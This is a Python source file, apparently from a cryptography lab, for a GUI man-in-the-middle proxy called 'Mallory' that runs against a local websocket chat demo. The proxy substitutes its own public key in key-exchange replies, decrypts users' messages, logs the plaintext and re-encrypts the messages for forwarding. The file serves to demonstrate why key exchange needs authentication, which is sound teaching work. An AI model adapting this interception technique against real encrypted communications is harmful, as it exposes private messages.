import asyncio, json, tkinter as tk
from tkinter import ttk
import websockets

from crypto_utils import generate_keypair, derive_session_key, encrypt_aesgcm, decrypt_aesgcm

LISTEN = "127.0.0.1"
LISTEN_PORT = 9001
UPSTREAM = "ws://127.0.0.1:8765"

class MitmProxyUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Mallory MITM Proxy UI")

        frm = ttk.Frame(self.root, padding=10)
        frm.grid(row=0, column=0, sticky="nsew")
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        frm.columnconfigure(0, weight=1)
        frm.rowconfigure(1, weight=1)

        ttk.Label(frm, text=f"LISTEN ws://{LISTEN}:{LISTEN_PORT}  ==>  UPSTREAM {UPSTREAM}",
                  font=("Segoe UI", 11, "bold")).grid(row=0, column=0, sticky="w")

        self.txt = tk.Text(frm, height=28, wrap="word")
        self.txt.grid(row=1, column=0, sticky="nsew", pady=(8,0))
        self.txt.configure(state="disabled")

        self.attack_mode = tk.BooleanVar(value=True)
        ttk.Checkbutton(frm, text="MITM 攻击模式（替换公钥 + 尝试解密明文）", variable=self.attack_mode)\
            .grid(row=2, column=0, sticky="w", pady=(8,0))

        self.kp = generate_keypair()
        self._log(f"[Mallory] session_pub={self.kp.public_key_bytes.hex()[:16]}...")

        # store per-client "claimed username" and derived keys
        self.ws_user = {}         # client_ws -> username
        self.key_with_user = {}   # username -> K(user<->Mallory) derived after register/pubkey flow

        self.loop = asyncio.new_event_loop()
        t = asyncio.get_event_loop_policy().new_event_loop()

    def _log(self, s: str):
        self.txt.configure(state="normal")
        self.txt.insert("end", s+"\n")
        self.txt.see("end")
        self.txt.configure(state="disabled")

    async def start(self):
        async def on_client(client_ws):
            async with websockets.connect(UPSTREAM) as server_ws:
                await asyncio.gather(
                    self.c2s(client_ws, server_ws),
                    self.s2c(client_ws, server_ws),
                )

        async with websockets.serve(on_client, LISTEN, LISTEN_PORT):
            self._log("[Mallory] proxy started")
            await asyncio.Future()

    async def c2s(self, client_ws, server_ws):
        async for msg in client_ws:
            data = json.loads(msg)
            typ = data.get("type")

            # --- register: learn user and precompute K(user, Mallory) ---
            if typ == "register":
                u = data.get("username")
                self.ws_user[client_ws] = u
                user_pub_hex = data.get("public_key")
                try:
                    self.key_with_user[u] = derive_session_key(self.kp.private_key, bytes.fromhex(user_pub_hex))
                except Exception:
                    pass
                self._log(f"[C->S] register user={u} pub={user_pub_hex[:16]}...")

            # --- send: decrypt -> re-encrypt ---
            elif typ == "send":
                u = self.ws_user.get(client_ws, "?")
                to = data.get("to")
                payload = data.get("payload", {})
                self._log(
                    f"[C->S] send {u}->{to} nonce={payload.get('nonce', '')} ct={payload.get('ciphertext', '')[:20]}...")

                if self.attack_mode.get():
                    k_from = self.key_with_user.get(u)  # K(u,M)
                    k_to = self.key_with_user.get(to)  # K(to,M)
                    if k_from and k_to:
                        aad = f"{u}->{to}".encode()
                        try:
                            pt = decrypt_aesgcm(k_from, payload["nonce"], payload["ciphertext"], aad=aad)
                            self._log(f"    [Mallory PLAINTEXT] {u}->{to}: {pt.decode('utf-8', errors='replace')}")
                            data["payload"] = encrypt_aesgcm(k_to, pt, aad=aad)
                            msg = json.dumps(data)
                            self._log("    [Mallory] re-encrypted and forwarded ✅")
                        except Exception as e:
                            self._log(f"    [Mallory] decrypt/re-encrypt failed: {e}")

            # 统一转发（关键：所有消息都要走到这里）
            await server_ws.send(msg)

    async def s2c(self, client_ws, server_ws):
        async for msg in server_ws:
            data = json.loads(msg)
            typ = data.get("type")

            # key substitution happens here: server -> client pubkey response
            if typ == "pubkey" and self.attack_mode.get():
                target = data.get("target")
                real_pk = data.get("public_key")
                # replace with Mallory's pub
                data["public_key"] = self.kp.public_key_bytes.hex()
                msg = json.dumps(data)

                self._log(f"[S->C] pubkey target={target} REAL={str(real_pk)[:16]}...  "
                          f"REPLACED_WITH_MALLORY={data['public_key'][:16]}...")
                # Note: in secure mode, identity_pub/sig remain but won't match replaced public_key => clients reject
            elif typ == "recv":
                sender = data.get("from")
                payload = data.get("payload", {})
                self._log(f"[S->C] recv from={sender} nonce={payload.get('nonce','')} ct={payload.get('ciphertext','')[:20]}...")

            await client_ws.send(msg)

    def run(self):
        def runner():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.start())

        import threading
        threading.Thread(target=runner, daemon=True).start()

        self.root.geometry("980x620")
        self.root.mainloop()

if __name__ == "__main__":
    MitmProxyUI().run()
